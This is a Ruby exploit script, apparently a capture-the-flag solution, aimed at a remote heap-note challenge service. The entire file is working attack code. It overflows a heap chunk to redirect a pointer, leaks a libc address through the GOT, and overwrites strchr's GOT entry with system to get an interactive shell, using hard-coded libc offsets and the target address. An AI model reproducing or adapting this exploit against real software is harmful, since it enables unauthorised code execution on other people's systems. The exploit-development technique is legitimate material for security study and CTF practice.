#!/usr/bin/env ruby
require '~/pwnlib.rb'

local = false#true
if local
	host, port = '127.0.0.1', 4444
	fgets_offset = 0x63c20
	one_gadget_offset = 0x3dcc7
	system_offset=0x3de10
else
	host, port = '78.46.224.83', 1456
	fgets_offset = 0x632a0
	one_gadget_offset = 0x3e297
	system_offset=0x3e3e0
end
def add(size, name, len, text)
	@r.recv_until("Action:")
	@r.send("0\n")
	@r.recv_until("size of description:")
	@r.send("#{size}\n")
	@r.recv_until("name:")
	@r.send("#{name}\n")
	@r.recv_until("text length:")
	@r.send("#{len}\n")
	@r.recv_until("text:")
	@r.send("#{text}\n")

end
def display(index)
	@r.recv_until("Action:")
	@r.send("2\n")
	@r.recv_until("index:")
	@r.send("#{index}\n")
	name = @r.recv_capture(/name: (.{4})/)[0].unpack("L")[0]
	descript = @r.recv_capture(/description: (.*)/)[0]
	return name
end
def delete(index)
	@r.recv_until("Action:")
	@r.send("1\n")
	@r.recv_until("index:")
	@r.send("#{index}\n")
end
def update(index, len, text)
	@r.recv_until("Action:")
	@r.send("3\n")
	@r.recv_until("index:")
	@r.send("#{index}\n")
	@r.recv_until("text length:")
	@r.send("#{len}\n")
	@r.recv_until("text:")
	@r.send("#{text}\n")
end
def quit()
	@r.recv_until("Action:")
	@r.send("4\n")
end
def p32(*addr)
	return addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r = r

	free_got = 0x804b010
	heap_array = 0x804b080
	puts_got = 0x804b024
	strchr_got = 0x804b02c

	add(10, "0", 10, "0")
	add(32, "1", 10, "1")
	delete(0)
	add(128, "2", 200, "2"*176+p32(heap_array+4))
	update(1, 8, p32(free_got))

	libc_base = display(1) - fgets_offset
	one_gadget = libc_base + one_gadget_offset
	system = libc_base+system_offset
	puts "[!] libc base : 0x#{libc_base.to_s(16)}"
	puts "[!] one_gadget: 0x#{one_gadget.to_s(16)}"


	add(10, "3", 10, "3")
	add(32, "4", 10, "4")
	delete(3)
	add(128, "5", 200, "5"*176+p32(strchr_got))
	update(4, 8, p32(system)+";sh;")
	
	#delete(4)

	@r.interactive()
	#@r.shell()
	quit()
end
